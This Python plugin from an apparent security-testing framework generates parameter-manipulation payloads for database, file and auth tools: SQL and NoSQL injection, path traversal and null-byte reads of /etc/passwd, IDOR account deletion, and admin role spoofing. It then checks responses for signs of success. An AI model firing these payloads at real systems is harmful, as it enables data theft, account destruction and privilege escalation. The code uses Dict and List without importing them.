# attacks/parameter_manipulation.py
from attacks.base import AttackPlugin, AttackPluginMetadata
from core.models import AttackPayload, TestResult
from core.enums import AttackType, ToolType, RiskLevel
import re
import json


class ParameterManipulationAttack(AttackPlugin):
    """Tests for parameter injection, schema exploitation, and business logic bypass"""

    metadata = AttackPluginMetadata(
        name="parameter_manipulation",
        version="1.2.0",
        description="Exploits weak parameter validation and business logic",
        attack_type=AttackType.PARAMETER_MANIPULATION,
        supported_tools=[ToolType.DATABASE, ToolType.FILE, ToolType.HTTP, ToolType.AUTH],
        risk_level=RiskLevel.CRITICAL,
        author="Security Team"
    )

    def generate_payloads(self, target_info: Dict) -> List[AttackPayload]:
        payloads = []
        tool_schema = target_info.get("tool_schema", {})

        # SQL Injection via parameters
        if ToolType.DATABASE in self.metadata.supported_tools:
            payloads.extend([
                AttackPayload(
                    id="PARAM-SQL-01",
                    tool_type=ToolType.DATABASE,
                    args={"sql": "SELECT * FROM users WHERE id = $1", "params": ["1 OR 1=1"]},
                    description="SQL injection via parameterized query bypass",
                    risk_level=RiskLevel.HIGH,
                    metadata={"technique": "parameter_injection"}
                ),
                AttackPayload(
                    id="PARAM-SQL-02",
                    tool_type=ToolType.DATABASE,
                    args={"query": {"$where": "this.password != ''"}},
                    description="NoSQL injection via query object",
                    risk_level=RiskLevel.CRITICAL,
                    metadata={"technique": "nosql_injection"}
                )
            ])

        # Path traversal via file parameters
        if ToolType.FILE in self.metadata.supported_tools:
            payloads.extend([
                AttackPayload(
                    id="PARAM-LFI-01",
                    tool_type=ToolType.FILE,
                    args={"path": "logs/../../../etc/passwd"},
                    description="Path traversal via relative path manipulation",
                    risk_level=RiskLevel.HIGH,
                    metadata={"technique": "path_traversal"}
                ),
                AttackPayload(
                    id="PARAM-LFI-02",
                    tool_type=ToolType.FILE,
                    args={"path": "/etc/passwd\x00.jpg"},  # Null byte injection
                    description="Null byte injection to bypass extension check",
                    risk_level=RiskLevel.HIGH,
                    metadata={"technique": "null_byte_injection"}
                )
            ])

        # IDOR and privilege escalation
        if ToolType.AUTH in self.metadata.supported_tools:
            payloads.extend([
                AttackPayload(
                    id="PARAM-IDOR-01",
                    tool_type=ToolType.AUTH,
                    args={"user_id": "123", "action": "delete_account"},
                    description="IDOR: Attempt to delete another user's account",
                    risk_level=RiskLevel.CRITICAL,
                    metadata={"technique": "insecure_direct_object_reference"}
                ),
                AttackPayload(
                    id="PARAM-PRIV-01",
                    tool_type=ToolType.AUTH,
                    args={"user_id": "current_user", "role": "admin", "bypass_check": True},
                    description="Privilege escalation via parameter spoofing",
                    risk_level=RiskLevel.CRITICAL,
                    metadata={"technique": "parameter_spoofing"}
                )
            ])

        return payloads

    def evaluate_response(self, payload: AttackPayload, response: Dict) -> TestResult:
        """Evaluate if parameter manipulation succeeded"""
        response_text = json.dumps(response).lower()
        vulnerable = False
        evidence = []

        # SQL injection indicators
        if payload.metadata.get("technique") == "parameter_injection":
            if any(indicator in response_text for indicator in ["user 1", "user 2", "multiple rows"]):
                vulnerable = True
                evidence.append("Multiple records returned on single-ID query")

        # NoSQL injection indicators
        if payload.metadata.get("technique") == "nosql_injection":
            if "password" in response_text and "hash" not in response_text:
                vulnerable = True
                evidence.append("Password data exposed via NoSQL injection")

        # Path traversal indicators
        if payload.metadata.get("technique") in ["path_traversal", "null_byte_injection"]:
            if any(indicator in response_text for indicator in ["root:x:0:0", "bin/bash", "daemon:x:"]):
                vulnerable = True
                evidence.append("Sensitive file contents exposed")

        # IDOR indicators
        if payload.metadata.get("technique") == "insecure_direct_object_reference":
            if "deleted" in response_text or "success" in response_text:
                vulnerable = True
                evidence.append("Account deletion succeeded without authorization")

        # Privilege escalation indicators
        if payload.metadata.get("technique") == "parameter_spoofing":
            if "role" in response_text and "admin" in response_text:
                vulnerable = True
                evidence.append("Role escalation via parameter manipulation")

        return TestResult(
            payload_id=payload.id,
            tool_name=payload.tool_type.value,
            success=response.get("status") != "error",
            vulnerable=vulnerable,
            evidence="; ".join(evidence) if evidence else "No vulnerability detected",
            risk_level=payload.risk_level,
            metadata={
                "technique": payload.metadata.get("technique"),
                "response_snippet": response_text[:200]
            }
        )